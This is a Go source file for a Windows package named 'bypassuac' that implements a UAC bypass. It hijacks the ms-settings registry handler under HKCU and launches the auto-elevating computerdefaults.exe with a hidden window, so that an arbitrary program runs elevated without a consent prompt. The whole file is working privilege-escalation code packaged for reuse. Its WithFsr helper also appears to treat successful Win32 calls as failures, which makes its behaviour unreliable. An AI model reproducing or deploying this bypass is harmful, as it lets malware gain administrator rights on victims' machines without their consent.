//go:build windows
// +build windows

// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package bypassuac

import (
	"errors"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

var (
	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
	procWow64DisableFsRedirection = kernel32.NewProc("Wow64DisableWow64FsRedirection")
	procWow64RevertFsRedirection  = kernel32.NewProc("Wow64RevertWow64FsRedirection")
)

func WithFsr(f func()) error {
	if f == nil {
		return errors.New("nullable function provided")
	}
	var oldWow64Fsr uintptr
	if ret, _, _ := procWow64DisableFsRedirection.Call(uintptr(unsafe.Pointer(&oldWow64Fsr))); ret != 0 {
		return errors.New("cannot execute Wow64DisableWow64FsRedirection")
	}
	f() // execute
	if ret, _, _ := procWow64RevertFsRedirection.Call(uintptr(oldWow64Fsr)); ret != 0 {
		return errors.New("cannot execute Wow64RevertWow64FsRedirection")
	}
	return nil
}

func ExecComputerdefaults(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
	if err = k.SetStringValue("", path); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	WithFsr(func() {
		e := exec.Command("computerdefaults.exe")
		e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = e.Run()
	})
	time.Sleep(3 * time.Second)
	return err
}
